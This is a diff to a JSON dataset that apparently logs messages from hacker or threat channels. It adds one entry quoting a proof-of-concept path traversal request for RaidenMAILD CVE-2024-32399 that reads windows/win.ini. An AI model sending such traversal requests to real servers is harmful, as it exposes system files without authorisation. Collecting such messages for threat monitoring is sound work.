@@ -12704,6 +12704,16 @@
                 "N/A"
             ],
             "URLs": []
+        },
+        {
+            "Message ID": 1960,
+            "Date": "2024-09-12",
+            "Content": "RaidenMAILD CVE-2024-32399\n\nGET /webeditor/../../../windows/win.ini HTTP/1.1\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
         }
     ],
     "Anonymous Chat": [
